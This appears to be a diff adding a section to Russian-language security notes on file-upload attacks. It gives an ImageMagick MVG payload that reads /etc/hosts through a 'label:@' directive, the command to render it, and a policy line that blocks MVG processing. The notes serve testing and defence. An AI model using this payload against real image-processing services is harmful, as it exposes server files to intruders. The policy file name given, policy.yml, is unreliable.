@@ -35,3 +35,36 @@ zip -y test.zip test
 Они исполнятся в любом случае? (например, если приложение на Ruby, а загрузили php, или cgi)
 
 А на Nginx?
+
+## ImageMagick MVG
+
+test.mvg:
+
+```
+push graphic-context 
+  viewbox 0 0 800 600
+  push graphic-context
+    push graphic-context
+      font-size 11
+      fill 'white'
+      stroke-width 1
+      image over 1,1 800,600 'label:@/etc/hosts'
+    pop graphic-context
+  pop graphic-context
+pop graphic-context
+```
+
+Convert:&#x20;
+
+```
+$ brew install magick
+$ magick mvg:test.mvg test.png
+```
+
+Mitigation:
+
+Запретить обработку MVG файлов: /etc/ImageMagick/policy.yml
+
+```markup
+ <policy domain="coder" rights="none" pattern="MVG" /> 
+```
